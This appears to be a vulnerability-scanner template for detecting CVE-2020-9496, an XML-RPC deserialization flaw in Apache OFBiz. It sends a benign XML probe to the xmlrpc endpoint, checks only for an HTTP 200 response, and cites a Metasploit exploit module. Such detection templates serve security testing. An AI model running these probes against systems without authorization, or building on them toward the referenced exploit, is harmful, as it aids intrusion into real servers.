id: poc-yaml-apache-ofbiz-cve-2020-9496-xml-deserialization

info:
  name: poc-yaml-apache-ofbiz-cve-2020-9496-xml-deserialization
  author: su(https://suzzz112113.github.io/#blog)
  severity: medium
  tags: xray-converted,deserialization,cve-2020-9496,ct-131351
  reference:
    - https://lists.apache.org/thread.html/r84ccbfc67bfddd35dced494a1f1cba504f49ac60a2a2ae903c5492c3%40%3Cdev.ofbiz.apache.org%3E
    - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/apache_ofbiz_deserialization.rb

http:
  - raw:
      - |
        POST /webtools/control/xmlrpc HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <?xml version="1.0"?><methodCall><methodName>{{rand_int(1000, 9999)}}</methodName><params><param><value>dwisiswant0</value></param></params></methodCall>

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200